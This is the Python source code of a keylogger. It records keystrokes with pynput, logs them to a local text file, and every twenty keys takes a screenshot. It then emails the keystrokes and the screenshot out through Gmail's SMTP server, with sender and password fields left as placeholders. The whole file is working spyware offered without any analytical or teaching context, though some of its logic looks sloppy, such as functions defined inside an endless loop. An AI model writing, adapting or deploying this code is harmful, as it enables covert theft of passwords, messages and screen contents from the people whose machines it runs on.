import smtplib, ssl
import pynput
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText  # Added
from email.mime.image import MIMEImage
import pyautogui
def capture():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'C:\codde\keylogger\image.jpg')
while True:
    message = ""
    def sendEmail(message):
        capture()
        From = "email"
        email = "email"
        passw = "pass"
        attachment = 'image.jpg' 
        body = message
        subject = 'keylogger'
        msg = MIMEMultipart()
        msg["To"] = email
        msg["From"] = From
        msg["Subject"] = 'keylogger'

        msgText = MIMEText('<b>%s</b><br/><img src="cid:%s"/><br/>' % (body, attachment), 'html')   
        msg.attach(msgText)   # Added, and edited the previous line

        with open(attachment, 'rb') as fp:
            img = MIMEImage(fp.read())
        img.add_header('Content-ID', '<{}>'.format(attachment))
        msg.attach(img)
        context = ssl.create_default_context()
        emailRezi = smtplib.SMTP("smtp.gmail.com", 587)
        emailRezi.ehlo() 
        emailRezi.starttls(context=context) 
        emailRezi.ehlo()
        emailRezi.set_debuglevel(1)
        emailRezi.login(From, passw)
        emailRezi.sendmail(From, email, msg.as_string())
        print("completed login to email")
    count = 0
    keys = []
    def on_press(key):
        print(key, end= " ")
        print("pressed")
        global keys, count
        keys.append(str(key))
        count += 1
        if count >= 20:
            count = 0
            email(keys, message)
    def email(keys, message):
        for key in keys:
            k = key.replace("'","")
            if key == "Key.space":
                k = " " 
            elif key.find("Key")>0:
                k = ""
            elif key == "Key.enter":
                k = "\n"
            elif "Key." in key:
                k = f" {key}\n "
            with open("text.txt", 'a') as file:
                file.write(k)
            message += k
        sendEmail(message)
        print("the message is: ", message)
        print("send email completed")
    def on_release(key):
        if key == Key.esc:
            return False
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()
